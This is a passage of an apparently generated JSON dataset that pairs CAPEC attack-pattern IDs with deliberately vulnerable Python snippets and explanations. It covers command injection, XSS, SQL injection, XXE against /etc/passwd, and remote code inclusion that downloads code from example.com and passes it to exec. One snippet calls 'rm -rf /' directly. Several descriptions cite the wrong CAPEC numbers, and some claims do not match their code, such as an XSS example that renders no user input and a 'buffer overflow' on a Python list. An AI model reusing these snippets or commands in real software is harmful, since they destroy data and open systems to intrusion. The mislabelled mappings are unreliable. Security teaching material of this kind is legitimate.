        "code_snippet": "import os\nimport signal\n\n# CWE-828: Signal handler with functionality that is not asynchronous-safe\ndef unsafe_signal_handler(signum, frame):\n    global privileged_data\n    privileged_data = os.getenv('PRIVILEGED_DATA')\n    print(f'Privileged data accessed: {privileged_data}')\n\n# Register the unsafe signal handler\nsignal.signal(signal.SIGUSR1, unsafe_signal_handler)\n\n# CWE-391: Unchecked error condition\ndef privileged_function():\n    try:\n        # Simulate privileged operation\n        result = 1 / 0  # This will raise a ZeroDivisionError\n    except ZeroDivisionError:\n        pass  # Error is ignored\n\n# CWE-782: Exposed IOCTL with insufficient access control\ndef exposed_ioctl(command):\n    if command == 'GET_PRIVILEGED_DATA':\n        return privileged_data\n    return 'Access Denied'\n\n# Simulate privileged thread of execution\nprivileged_data = 'Sensitive Information'\nprivileged_function()\n\n# Simulate an attacker sending a signal to hijack the privileged thread\nos.kill(os.getpid(), signal.SIGUSR1)\n\n# Simulate an attacker accessing privileged data via exposed IOCTL\nprint(exposed_ioctl('GET_PRIVILEGED_DATA'))",
        "description": "This Python code snippet demonstrates a scenario where an attacker can hijack a privileged thread of execution by exploiting a signal handler that is not asynchronous-safe (CWE-828). The signal handler accesses privileged data, which can be triggered by an attacker sending a signal (SIGUSR1). Additionally, the code includes an unchecked error condition (CWE-391) in a privileged function, where a ZeroDivisionError is ignored, potentially leading to unexpected behavior. Finally, the code exposes an IOCTL command (CWE-782) that allows access to privileged data without proper access control. This combination of vulnerabilities illustrates the main idea of CAPEC-30: Hijacking a Privileged Thread of Execution."
    },
    {
        "capec_id": "237",
        "capec_name": "Escaping a Sandbox by Calling Code in Another Language",
        "code_snippet": "import ctypes\n\n# Unsafe JNI equivalent in Python using ctypes to call C code\nlibc = ctypes.CDLL('libc.so.6')\n\n# Function to call system command using C library\ndef unsafe_system_call(command):\n    libc.system(command.encode('utf-8'))\n\n# Example usage\nunsafe_system_call('echo Hello, World!')\nunsafe_system_call('rm -rf /')  # Dangerous command\n",
        "description": "This Python code snippet demonstrates a vulnerability similar to 'Escaping a Sandbox by Calling Code in Another Language' (CAPEC-693). It uses the ctypes library to call native C code from Python, which is analogous to using JNI in Java. The 'unsafe_system_call' function allows execution of arbitrary system commands, representing a 'Protection Mechanism Failure' (CWE-693) and 'Direct Use of Unsafe JNI' (CWE-111). This can lead to severe security issues, such as executing dangerous commands ('rm -rf /'), which can delete all files on the system. The code highlights the risk of allowing untrusted code to call native functions directly, bypassing the safety mechanisms of the higher-level language."
    },
    {
        "capec_id": "238",
        "capec_name": "DEPRECATED: Using URL/codebase / G.A.C. (code source) to convince sandbox of privilege",
        "code_snippet": "import os\nfrom flask import Flask, request, send_from_directory\n\napp = Flask(__name__)\n\n# CWE-551: Incorrect Behavior Order: Authorization Before Parsing and Canonicalization\n@app.route('/download/<path:filename>')\ndef download_file(filename):\n    # CWE-424: Improper Protection of Alternate Path\n    if not user_is_authorized(request):\n        return 'Unauthorized', 403\n    # CWE-657: Violation of Secure Design Principles\n    # CWE-670: Always-Incorrect Control Flow Implementation\n    # CWE-1107: Insufficient Isolation of Symbolic Constant Definitions\n    base_directory = '/var/www/files'\n    return send_from_directory(base_directory, filename)\n\n# Dummy authorization function\ndef user_is_authorized(request):\n    return request.args.get('token') == 'valid_token'\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a vulnerable Flask web application endpoint that allows users to download files. The main idea of the deprecated CAPEC is represented by the improper handling of URL paths and authorization checks. The code first checks if the user is authorized before parsing and canonicalizing the requested filename (CWE-551). It also fails to protect alternate paths adequately (CWE-424), potentially allowing unauthorized access to restricted files. The code violates secure design principles (CWE-657) by not properly isolating symbolic constants (CWE-1107) and contains an incorrect control flow implementation (CWE-670) by not ensuring the filename is safe before serving the file. This can lead to directory traversal attacks and unauthorized file access."
    },
    {
        "capec_id": "239",
        "capec_name": "DEPRECATED: Subversion of Authorization Checks: Cache Filtering, Programmatic Security, etc.",
        "code_snippet": "import hashlib\n\n# Simulated client-side authentication\nclass Client:\n    def __init__(self, username, password):\n        self.username = username\n        self.password = hashlib.sha256(password.encode()).hexdigest()\n\n    def authenticate(self):\n        # Client-side authentication logic\n        if self.username == 'admin' and self.password == hashlib.sha256('password'.encode()).hexdigest():\n            return True\n        return False\n\n# Simulated server-side functionality\nclass Server:\n    def __init__(self):\n        self.data = 'Sensitive Data'\n\n    def get_data(self, client):\n        # Server relies on client-side authentication\n        if client.authenticate():\n            return self.data\n        else:\n            return 'Access Denied'\n\n# Example usage\nclient = Client('admin', 'password')\nserver = Server()\nprint(server.get_data(client))  # Outputs: Sensitive Data\n\n# Malicious client bypassing authentication\nclass MaliciousClient(Client):\n    def authenticate(self):\n        return True\n\nmalicious_client = MaliciousClient('admin', 'password')\nprint(server.get_data(malicious_client))  # Outputs: Sensitive Data",
        "description": "This Python code snippet demonstrates a vulnerability where the server relies on client-side authentication, which can be easily bypassed by a malicious client. The `Client` class simulates a client-side authentication mechanism, while the `Server` class relies on this client-side authentication to grant access to sensitive data. A `MaliciousClient` class is then created to bypass the authentication by always returning `True` in the `authenticate` method. This represents the CWE-603 (Use of Client-Side Authentication) and CWE-602 (Client-Side Enforcement of Server-Side Security) weaknesses, illustrating how an attacker can subvert authorization checks by modifying the client code."
    },
    {
        "capec_id": "240",
        "capec_name": "Resource Injection",
        "code_snippet": "import os\n\ndef read_file(file_path):\n    # CWE-20: Improper Input Validation\n    if not isinstance(file_path, str) or '..' in file_path or file_path.startswith('/'):\n        raise ValueError('Invalid file path')\n\n    # CWE-99: Improper Control of Resource Identifiers\n    with open(file_path, 'r') as file:\n        return file.read()\n\n# Example usage\nuser_input = input('Enter the file name to read: ')\nprint(read_file(user_input))",
        "description": "This Python code snippet demonstrates a vulnerability related to Resource Injection (CAPEC-99) by improperly validating and using a file path provided by the user. The `read_file` function attempts to validate the input file path but does so inadequately. Specifically, it checks if the input is a string and if it contains '..' or starts with '/', but this validation is insufficient to prevent all forms of path traversal attacks. An attacker could still manipulate the file path to access unintended files. The code reads the content of the file specified by the user input, which could lead to unauthorized access to sensitive files. This example highlights the importance of proper input validation and control of resource identifiers to prevent security vulnerabilities."
    },
    {
        "capec_id": "241",
        "capec_name": "DEPRECATED: Code Injection",
        "code_snippet": "import os\n\n# Vulnerable function that executes user input as code\n\ndef execute_user_code(user_input):\n    # CWE-477: Using an obsolete function 'execfile' (Python 2.x)\n    execfile(user_input)\n\n# Example usage\nuser_input = 'user_script.py'  # This should be validated and sanitized\nexecute_user_code(user_input)",
        "description": "This Python code snippet demonstrates a vulnerable function that executes user input as code, embodying the main idea of CAPEC-242: Code Injection. The function 'execute_user_code' takes user input and uses the 'execfile' function to execute it. This is a deprecated and obsolete function in Python 2.x (CWE-477: Use of Obsolete Function). The code does not validate or sanitize the user input, making it susceptible to code injection attacks. An attacker could provide a malicious script as input, leading to arbitrary code execution."
    },
    {
        "capec_id": "242",
        "capec_name": "Code Injection",
        "code_snippet": "import os\n\ndef execute_command(user_input):\n    # CWE-77: Improper Neutralization of Special Elements used in a Command ('Command Injection')\n    command = f'echo {user_input}'\n    os.system(command)\n\n# Example usage\nuser_input = input('Enter a command: ')\nexecute_command(user_input)\n",
        "description": "This Python code snippet demonstrates a code injection vulnerability, specifically a command injection (CWE-77). The function `execute_command` takes user input and constructs a shell command using string interpolation. The user input is not properly sanitized or neutralized, allowing an attacker to inject arbitrary commands. For example, if the user inputs `; rm -rf /`, the constructed command would be `echo ; rm -rf /`, which could lead to severe consequences. This snippet embodies the main idea of CAPEC-94, where an adversary exploits improper input validation to inject malicious code."
    },
    {
        "capec_id": "243",
        "capec_name": "XSS Targeting HTML Attributes",
        "code_snippet": "from flask import Flask, request, render_template_string\n\napp = Flask(__name__)\n\n@app.route('/search')\ndef search():\n    query = request.args.get('query', '')\n    # Vulnerable to XSS in HTML attributes\n    html_content = f'<a href=\"#\" style=\"color:red\" onmouseover=\"alert(\\'{query}\\')\">Hover over me</a>'\n    return render_template_string(html_content)\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a Flask web application that is vulnerable to Cross-Site Scripting (XSS) targeting HTML attributes. The application has a single route '/search' that takes a 'query' parameter from the URL. The 'query' parameter is directly inserted into an HTML attribute (onmouseover) without proper sanitization. This allows an attacker to inject malicious JavaScript code, which will be executed when a user hovers over the link. This example embodies the main idea of CAPEC-165 (XSS Targeting HTML Attributes) and is related to several CWEs, including CWE-83 (Improper Neutralization of Script in Attributes in a Web Page) and CWE-79 (Improper Neutralization of Input During Web Page Generation)."
    },
    {
        "capec_id": "244",
        "capec_name": "XSS Targeting URI Placeholders",
        "code_snippet": "from flask import Flask, request, render_template_string\n\napp = Flask(__name__)\n\n@app.route('/vulnerable', methods=['GET'])\ndef vulnerable():\n    user_input = request.args.get('input', '')\n    # Vulnerable to XSS via URI placeholders\n    html_content = f'<a href=\"{user_input}\">Click here</a>'\n    return render_template_string(html_content)\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a Flask web application that is vulnerable to Cross-Site Scripting (XSS) attacks targeting URI placeholders. The application takes user input from a query parameter 'input' and directly embeds it into an anchor tag's href attribute without proper sanitization or neutralization. This allows an attacker to inject a malicious URI, such as 'javascript:alert(1)', which will be executed when the victim clicks on the link. The code embodies the main idea of the CAPEC by showing how improper neutralization of user input in URI placeholders can lead to XSS vulnerabilities. The related CWEs provide additional context on the types of improper neutralizations that can occur, such as in script attributes, IMG tags, and encoded URI schemes."
    },
    {
        "capec_id": "245",
        "capec_name": "XSS Using Doubled Characters",
        "code_snippet": "from flask import Flask, request, render_template_string\n\napp = Flask(__name__)\n\n@app.route('/search', methods=['GET'])\n\ndef search():\n    query = request.args.get('query', '')\n    # Vulnerable to doubled character XSS attack\n    return render_template_string('<h1>Search Results for: {{ query }}</h1>')\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a simple Flask web application that is vulnerable to a doubled character XSS attack. The application has a single route '/search' that takes a 'query' parameter from the URL. The 'query' parameter is directly rendered into the HTML response without proper sanitization or validation. An attacker can exploit this by doubling characters in the input, such as using '<<script>alert(1);</script>' instead of '<script>alert(1);</script>', to bypass basic input validation and execute malicious scripts. This example highlights the importance of proper input sanitization and validation to prevent XSS attacks, as described in the CAPEC and related CWEs."
    },
    {
        "capec_id": "246",
        "capec_name": "DEPRECATED: XSS Using Flash",
        "code_snippet": "from flask import Flask, request, render_template_string\n\napp = Flask(__name__)\n\n@app.route('/submit', methods=['POST'])\ndef submit():\n    user_input = request.form['user_input']\n    # Incomplete denylist for XSS protection\n    denylist = ['<script>', '</script>', 'javascript:']\n    for item in denylist:\n        user_input = user_input.replace(item, '')\n    # Vulnerable to XSS via IMG tag attributes\n    response = f'<img src=\"{user_input}\" />'\n    return render_template_string(response)\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a vulnerable web application using Flask. The application accepts user input via a POST request and attempts to sanitize it using an incomplete denylist, which is a common weakness (CWE-692). The denylist approach fails to cover all possible XSS vectors, leaving the application susceptible to attacks. Additionally, the code directly inserts user input into an IMG tag's src attribute without proper neutralization (CWE-82), making it vulnerable to XSS attacks. This example embodies the main idea of the deprecated CAPEC pattern 'XSS Using Flash' by illustrating how improper input handling and incomplete security measures can lead to XSS vulnerabilities."
    },
    {
        "capec_id": "247",
        "capec_name": "XSS Using Invalid Characters",
        "code_snippet": "from flask import Flask, request, render_template_string\n\napp = Flask(__name__)\n\n@app.route('/search', methods=['GET'])\ndef search():\n    query = request.args.get('query', '')\n    # Improper neutralization of invalid characters\n    sanitized_query = query.replace('<', '&lt;').replace('>', '&gt;')\n    # Potentially dangerous input is not fully sanitized\n    response = f\"<h1>Search Results for: {sanitized_query}</h1>\"\n    return render_template_string(response)\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a basic Flask web application that is vulnerable to XSS attacks due to improper neutralization of invalid characters in user input. The 'search' route takes a 'query' parameter from the URL, attempts to sanitize it by replacing '<' and '>' characters, but fails to handle other invalid characters like null, carriage return, line feed, or tab. This incomplete sanitization can be exploited by an attacker to inject malicious scripts, bypassing the filter and potentially executing XSS attacks. The code highlights the importance of comprehensive input validation and proper encoding to prevent such vulnerabilities."
    },
    {
        "capec_id": "248",
        "capec_name": "Command Injection",
        "code_snippet": "import os\n\ndef execute_command(user_input):\n    # Vulnerable to command injection\n    command = f'ls {user_input}'\n    os.system(command)\n\n# Example usage\nuser_input = input('Enter directory name: ')\nexecute_command(user_input)",
        "description": "This Python code snippet demonstrates a command injection vulnerability. The function `execute_command` takes user input and constructs an OS command string using that input. The command is then executed using `os.system()`. If the user input is not properly sanitized, an attacker can inject malicious commands. For example, if the user inputs `; rm -rf /`, it would result in the execution of `ls ; rm -rf /`, potentially causing significant damage. This snippet embodies the main idea of CAPEC-88 and related CWEs, highlighting the risks of improper neutralization of special elements in command construction."
    },
    {
        "capec_id": "249",
        "capec_name": "DEPRECATED: Linux Terminal Injection",
        "code_snippet": "import os\n\n# Vulnerable function that executes a command based on user input\ndef execute_command(user_input):\n    # CWE-77: Command Injection vulnerability\n    command = f'echo {user_input}'\n    os.system(command)\n\n# Example usage\nuser_input = input('Enter a string to echo: ')\nexecute_command(user_input)\n",
        "description": "This Python code snippet demonstrates a command injection vulnerability (CWE-77) by constructing an OS command using user input without proper neutralization of special elements. The `execute_command` function takes user input and directly incorporates it into a shell command using `os.system`. This can be exploited by an attacker to execute arbitrary commands. For example, if the user inputs `; rm -rf /`, it would result in the deletion of the root directory. This snippet embodies the main idea of the deprecated CAPEC 'Linux Terminal Injection' by showing how improper handling of user input can lead to command injection vulnerabilities."
    },
    {
        "capec_id": "250",
        "capec_name": "XML Injection",
        "code_snippet": "import xml.etree.ElementTree as ET\n\n# Simulated user input\nuser_input = \"<user><name>admin</name><password>' or '1'='1</password></user>\"\n\n# Parse the XML input\ntry:\n    root = ET.fromstring(user_input)\n    username = root.find('name').text\n    password = root.find('password').text\n\n    # Simulated XML database query\n    query = f\"//users/user[name='{username}' and password='{password}']\"\n    print(f\"Executing query: {query}\")\n\n    # Simulated database response\n    if username == 'admin' and password == \"' or '1'='1\":\n        print(\"Authentication bypassed! Access granted.\")\n    else:\n        print(\"Access denied.\")\nexcept ET.ParseError as e:\n    print(f\"Error parsing XML: {e}\")",
        "description": "This Python code snippet demonstrates an XML Injection vulnerability. The code simulates user input that includes an XML payload. The input is parsed using the xml.etree.ElementTree module, and an XPath query is constructed using the parsed data. The query is then executed against a simulated XML database. The user input is not properly sanitized, allowing an attacker to inject malicious data into the XML structure. In this example, the injected payload bypasses authentication by exploiting the improper neutralization of special elements within the XPath expression. This code embodies the main idea of CAPEC-91 (XML Injection) and related CWEs, highlighting the risks of improper input validation and neutralization."
    },
    {
        "capec_id": "251",
        "capec_name": "Local Code Inclusion",
        "code_snippet": "import os\n\n# CWE-829: Inclusion of Functionality from Untrusted Control Sphere\n# CWE-913: Improper Control of Dynamically-Managed Code Resources\n# CWE-1108: Excessive Reliance on Global Variables\n\n# Global variable to store the path of the file to be included\nfile_path = '/tmp/malicious_code.py'\n\n# Function to include and execute code from a local file\n# This represents the Local Code Inclusion vulnerability\n# CWE-506: Embedded Malicious Code\n# CWE-1102: Reliance on Machine-Dependent Data Representation\n\ndef include_local_code(file_path):\n    if os.path.exists(file_path):\n        with open(file_path, 'r') as file:\n            code = file.read()\n            exec(code)  # Dangerous: executing arbitrary code from a file\n    else:\n        print('File does not exist')\n\n# Simulate an attacker placing a malicious file on the local machine\nwith open(file_path, 'w') as file:\n    file.write('print(\"Malicious code executed\")')\n\n# Include and execute the malicious code\ninclude_local_code(file_path)",
        "description": "This Python code snippet demonstrates a Local Code Inclusion vulnerability. The code reads and executes a Python file from a specified local path, which can be exploited by an attacker to execute arbitrary code. The global variable 'file_path' is used to store the path of the file to be included, representing CWE-1108 (Excessive Reliance on Global Variables). The function 'include_local_code' checks if the file exists and then reads and executes its content using 'exec()', which is dangerous and represents CWE-913 (Improper Control of Dynamically-Managed Code Resources) and CWE-506 (Embedded Malicious Code). The code also simulates an attacker placing a malicious file on the local machine, which is then executed, demonstrating the main idea of the CAPEC."
    },
    {
        "capec_id": "252",
        "capec_name": "PHP Local File Inclusion",
        "code_snippet": "import os\nfrom flask import Flask, request, send_from_directory\n\napp = Flask(__name__)\n\n@app.route('/load_file')\ndef load_file():\n    filename = request.args.get('filename')\n    if not filename:\n        return 'Filename not provided', 400\n    try:\n        # CWE-829: Inclusion of Functionality from Untrusted Control Sphere\n        # CWE-98: Improper Control of Filename for Include/Require Statement in PHP Program\n        # CWE-646: Reliance on File Name or Extension of Externally-Supplied File\n        # CWE-473: PHP External Variable Modification\n        return send_from_directory('/var/www/files', filename)\n    except Exception as e:\n        return str(e), 500\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a vulnerable web application using Flask. The application has an endpoint '/load_file' that takes a 'filename' parameter from the query string and attempts to serve the file from the '/var/www/files' directory. The code does not validate or sanitize the 'filename' parameter, making it susceptible to Local File Inclusion (LFI) attacks. An attacker could exploit this by providing a path to a sensitive file on the server, potentially gaining access to unauthorized data or executing arbitrary code. This example embodies the main idea of CAPEC-152 (PHP Local File Inclusion) and incorporates related CWEs such as CWE-829, CWE-98, CWE-646, and CWE-473 by demonstrating the risks of including functionality from untrusted sources and improper control of filenames."
    },
    {
        "capec_id": "253",
        "capec_name": "Remote Code Inclusion",
        "code_snippet": "import requests\n\n# CWE-494: Download of Code Without Integrity Check\nurl = 'http://example.com/malicious_code.py'\nresponse = requests.get(url)\n\n# CWE-829: Inclusion of Functionality from Untrusted Control Sphere\nexec(response.text)\n",
        "description": "This Python code snippet demonstrates a Remote Code Inclusion vulnerability. It downloads a Python script from a remote URL without performing any integrity checks (CWE-494). The downloaded code is then executed using the `exec` function, which includes functionality from an untrusted control sphere (CWE-829). This can lead to the execution of malicious code, representing the main idea of the CAPEC."
    },
    {
        "capec_id": "254",
        "capec_name": "DEPRECATED: DTD Injection in a SOAP Message",
        "code_snippet": "import requests\nfrom lxml import etree\n\n# Vulnerable SOAP message with DTD injection\nsoap_message = '''\n<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:web=\"http://example.com/webservices\">\n   <soapenv:Header/>\n   <soapenv:Body>\n      <web:SomeRequest>\n         <web:input><![CDATA[\n            <!DOCTYPE foo [\n               <!ELEMENT foo ANY >\n               <!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]>\n            <foo>&xxe;</foo>\n         ]]></web:input>\n      </web:SomeRequest>\n   </soapenv:Body>\n</soapenv:Envelope>\n'''\n\n# Sending the SOAP request to a vulnerable web service\nresponse = requests.post('http://example.com/webservice', data=soap_message, headers={'Content-Type': 'text/xml'})\n\n# Parsing the response\ntry:\n    root = etree.fromstring(response.content)\n    print(etree.tostring(root, pretty_print=True).decode())\nexcept etree.XMLSyntaxError as e:\n    print(f'Error parsing XML: {e}')",
        "description": "This Python code snippet demonstrates a SOAP message containing a DTD injection vulnerability. The SOAP message includes a Document Type Definition (DTD) that defines an external entity 'xxe' which references the local file '/etc/passwd'. When this SOAP message is processed by a vulnerable web service, it may expose sensitive information from the server's file system. The code sends the crafted SOAP message to a web service endpoint and attempts to parse the response. This example highlights the risks associated with improper control of DTDs (CWE-827) and the potential for XML Entity Expansion (CWE-776)."
    },
    {
        "capec_id": "256",
        "capec_name": "SOAP Array Overflow",
        "code_snippet": "import struct\n\ndef process_soap_request(data):\n    # Extract the length of the array from the SOAP request\n    array_length = struct.unpack('I', data[:4])[0]\n    \n    # Allocate buffer based on the specified length\n    buffer = [0] * array_length\n    \n    # Read the actual data into the buffer\n    for i in range(array_length):\n        buffer[i] = data[4 + i]\n    \n    return buffer\n\n# Example SOAP request with understated length\nsoap_request = struct.pack('I', 4) + b'1234567890'\n\n# Process the SOAP request\nresult = process_soap_request(soap_request)\nprint(result)",
        "description": "This Python code snippet demonstrates a vulnerable SOAP request processing function that embodies the 'SOAP Array Overflow' CAPEC. The function `process_soap_request` extracts the length of an array from the first 4 bytes of the input data and allocates a buffer based on this length. It then reads the actual data into the buffer. If the actual data length exceeds the specified length, this can lead to a buffer overflow, as the function naively trusts the specified length. This example includes a SOAP request with an understated length, which can cause the function to read beyond the allocated buffer, leading to potential memory corruption. The code highlights vulnerabilities related to CWE-805, CWE-130, CWE-806, CWE-120, and CWE-122."
    },
    {
        "capec_id": "257",
        "capec_name": "DEPRECATED: Abuse of Transaction Data Structure",
        "code_snippet": "import logging\n\n# CWE-532: Information Exposure Through Log Files\nlogging.basicConfig(filename='app.log', level=logging.DEBUG)\n\n# Simulated transaction data structure\nclass Transaction:\n    def __init__(self, user_id, amount):\n        self.user_id = user_id\n        self.amount = amount\n\n# CWE-287: Authentication Bypass Issues\nclass AuthService:\n    def authenticate(self, user_id):\n        # Insecure authentication mechanism\n        return True\n\n# CWE-493: Failure to provide confidentiality for stored data\nclass TransactionService:\n    def __init__(self):\n        self.transactions = []\n\n    def add_transaction(self, transaction):\n        self.transactions.append(transaction)\n        logging.debug(f'Transaction added: {transaction.user_id}, {transaction.amount}')\n\n# Main function to demonstrate the vulnerability\ndef main():\n    auth_service = AuthService()\n    transaction_service = TransactionService()\n\n    # Insecure authentication\n    if auth_service.authenticate('user123'):\n        transaction = Transaction('user123', 100)\n        transaction_service.add_transaction(transaction)\n\nif __name__ == '__main__':\n    main()",
        "description": "This Python code snippet demonstrates several deprecated CWE weaknesses in the context of a transaction data structure. The `AuthService` class contains an insecure authentication mechanism (CWE-287), always returning `True` for any user ID. The `TransactionService` class logs transaction details, including user ID and amount, to a log file without proper confidentiality measures (CWE-493). Additionally, the logging configuration exposes sensitive information through log files (CWE-532). The main function simulates adding a transaction after an insecure authentication check, embodying the deprecated CAPEC concept of abusing a transaction data structure."
    },
    {
        "capec_id": "258",
        "capec_name": "DEPRECATED: Passively Sniffing and Capturing Application Code Bound for an Authorized Client During Dynamic Update",
        "code_snippet": "import socket\n\n# Vulnerable client-side authentication\nclass Client:\n    def __init__(self, server_ip, server_port):\n        self.server_ip = server_ip\n        self.server_port = server_port\n        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\n    def authenticate(self, username, password):\n        # Client-side authentication (vulnerable)\n        if username == 'admin' and password == 'password':\n            return True\n        return False\n\n    def connect(self):\n        self.sock.connect((self.server_ip, self.server_port))\n        print('Connected to server')\n\n    def send_data(self, data):\n        if self.authenticate('admin', 'password'):\n            self.sock.sendall(data.encode('utf-8'))\n            print('Data sent')\n        else:\n            print('Authentication failed')\n\n# Example usage\nclient = Client('127.0.0.1', 8080)\nclient.connect()\nclient.send_data('Sensitive data')",
        "description": "This Python code snippet demonstrates a vulnerable client-side authentication mechanism. The `Client` class performs authentication on the client side using hardcoded credentials ('admin' and 'password'). This is an example of CWE-603 (Use of Client-Side Authentication), which allows an attacker to bypass authentication by modifying the client code. Additionally, the code does not protect the data being sent over the network, making it susceptible to sniffing and capture-replay attacks (CWE-294). The main idea of the CAPEC is represented by the insecure client-side authentication and the potential for an attacker to capture and replay the authentication data to gain unauthorized access."
    },
    {
        "capec_id": "259",
        "capec_name": "DEPRECATED: Passively Sniffing and Capturing Application Code Bound for an Authorized Client During Patching",
        "code_snippet": "import socket\n\n# Vulnerable client-side authentication\nclass Client:\n    def __init__(self, server_ip, server_port):\n        self.server_ip = server_ip\n        self.server_port = server_port\n        self.authenticated = False\n\n    def authenticate(self, username, password):\n        # Simulate sending credentials over the network\n        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\n            s.connect((self.server_ip, self.server_port))\n            s.sendall(f'{username}:{password}'.encode())\n            response = s.recv(1024).decode()\n            if response == 'OK':\n                self.authenticated = True\n\n    def send_data(self, data):\n        if not self.authenticated:\n            raise Exception('Client not authenticated')\n        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\n            s.connect((self.server_ip, self.server_port))\n            s.sendall(data.encode())\n\n# Example usage\nclient = Client('127.0.0.1', 8080)\nclient.authenticate('user', 'pass')\nclient.send_data('Sensitive data')",
        "description": "This Python code snippet demonstrates a vulnerable client-side authentication mechanism. The `Client` class attempts to authenticate by sending credentials over the network to a server. If the server responds with 'OK', the client considers itself authenticated and proceeds to send data. This setup is vulnerable to capture-replay attacks (CWE-294) because the credentials are sent in plaintext and can be sniffed and replayed by an attacker. Additionally, the authentication is performed on the client side (CWE-603), making it possible for an attacker to bypass authentication by modifying the client code. This code embodies the main idea of the deprecated CAPEC, which involves sniffing and capturing application code or credentials during transmission."
    },
    {
        "capec_id": "260",
        "capec_name": "DEPRECATED: Passively Sniffing and Capturing Application Code Bound for an Authorized Client During Initial Distribution",
        "code_snippet": "import socket\n\n# Vulnerable server code that sends application code to a client\nserver_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nserver_socket.bind(('localhost', 8080))\nserver_socket.listen(1)\n\nprint('Server is listening on port 8080...')\n\nwhile True:\n    client_socket, addr = server_socket.accept()\n    print(f'Connection from {addr} has been established.')\n    \n    # Sending application code to the client without encryption\n    application_code = 'print(\"Hello, World!\")'\n    client_socket.send(application_code.encode('utf-8'))\n    \n    client_socket.close()",
        "description": "This Python code snippet represents a vulnerable server that sends application code to a client over an unencrypted connection. The server listens on port 8080 and sends a simple Python script to any client that connects. This embodies the main idea of CAPEC-65, where an attacker can sniff and capture application code during its initial distribution. The lack of encryption makes it easy for an attacker to intercept the code. This example also touches on CWE-294 (Authentication Bypass by Capture-replay) and CWE-603 (Use of Client-Side Authentication) by demonstrating a scenario where sensitive data is transmitted without proper security measures."
    },
    {
        "capec_id": "261",
        "capec_name": "Fuzzing for garnering other adjacent user/sensitive data",
        "code_snippet": "import sqlite3\n\n# Connect to the database\nconn = sqlite3.connect('example.db')\ncursor = conn.cursor()\n\n# Create a table\ncursor.execute('''CREATE TABLE IF NOT EXISTS users (id INTEGER PRIMARY KEY, username TEXT, password TEXT)''')\nconn.commit()\n\n# Function to fetch user data based on username\n# This function is vulnerable to SQL Injection\n# CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')\ndef get_user_data(username):\n    query = f\"SELECT * FROM users WHERE username = '{username}'\"\n    cursor.execute(query)\n    return cursor.fetchall()\n\n# Example usage\ntry:\n    # CWE-20: Improper Input Validation\n    # CWE-943: Improper Neutralization of Special Elements in Data Query Logic\n    user_data = get_user_data(\"admin' OR '1'='1\")\n    print(user_data)\nexcept sqlite3.Error as e:\n    # CWE-209: Generation of Error Message Containing Sensitive Information\n    print(f\"An error occurred: {e}\")\n\n# Close the connection\nconn.close()",
        "description": "This Python code snippet demonstrates a vulnerable function `get_user_data` that fetches user data from a SQLite database based on a provided username. The function constructs an SQL query using string interpolation, making it susceptible to SQL Injection (CWE-89). An attacker can exploit this by providing a specially crafted username, such as \"admin' OR '1'='1\", to retrieve all user data. The code also lacks proper input validation (CWE-20) and does not neutralize special elements in the data query logic (CWE-943). Additionally, if an error occurs, the error message may expose sensitive information (CWE-209). This snippet embodies the main idea of the CAPEC by showing how an adversary can send modified queries to garner sensitive data beyond what is expected."
    },
    {
        "capec_id": "263",
        "capec_name": "Force Use of Corrupted Files",
        "code_snippet": "import os\nimport tempfile\n\n# CWE-377: Insecure Temporary File\n# CWE-434: Unrestricted Upload of File with Dangerous Type\n# CWE-646: Reliance on File Name or Extension of Externally-Supplied File\n\ndef process_file(file_path):\n    if not os.path.exists(file_path):\n        raise FileNotFoundError('File does not exist')\n\n    # CWE-646: Reliance on file extension\n    if not file_path.endswith('.txt'):\n        raise ValueError('Unsupported file type')\n\n    with open(file_path, 'r') as file:\n        data = file.read()\n        # Simulate processing the file\n        print('Processing file content:', data)\n\n# CWE-377: Insecure Temporary File\ntemp_file = tempfile.NamedTemporaryFile(delete=False)\ntry:\n    temp_file.write(b'corrupted content')\n    temp_file.close()\n\n    # CWE-434: Unrestricted upload of dangerous file type\n    process_file(temp_file.name)\nfinally:\n    os.remove(temp_file.name)\n",
        "description": "This Python code snippet demonstrates a scenario where an application processes a file that could be corrupted by an attacker. The `process_file` function checks if the file exists and relies on the file extension to determine if it should be processed (CWE-646). It then reads and processes the file content. A temporary file is created insecurely (CWE-377) and written with corrupted content. The `process_file` function is called with this temporary file, simulating the processing of a potentially dangerous file type (CWE-434). This represents the main idea of the CAPEC, where an application is forced to use a corrupted file, potentially leading to denial of service or other vulnerabilities."
    },
    {
        "capec_id": "264",
        "capec_name": "DEPRECATED: Environment Variable Manipulation",
        "code_snippet": "import os\n\ndef execute_command():\n    # CWE-1108: Excessive Reliance on Global Variables\n    global command\n    command = os.getenv('USER_COMMAND')\n    if command:\n        # CWE-95: Improper Neutralization of Directives in Dynamically Evaluated Code ('Eval Injection')\n        eval(command)\n\n# CWE-1106: Insufficient Use of Symbolic Constants\n# Using a literal constant instead of a symbolic constant\nos.environ['USER_COMMAND'] = 'print(\"Hello, World!\")'\n\nexecute_command()",
        "description": "This Python code snippet demonstrates a vulnerable pattern related to environment variable manipulation, specifically CAPEC-13: Subverting Environment Variable Values. The code retrieves a command from an environment variable 'USER_COMMAND' and executes it using the eval() function. This is dangerous because it allows for arbitrary code execution if the environment variable is manipulated by an attacker. The code also exhibits several related CWEs: CWE-95 (Eval Injection) by using eval() on untrusted input, CWE-1108 (Excessive Reliance on Global Variables) by using a global variable for the command, and CWE-1106 (Insufficient Use of Symbolic Constants) by directly using a string literal instead of a symbolic constant."
    },
    {
        "capec_id": "265",
        "capec_name": "DEPRECATED: Global variable manipulation",
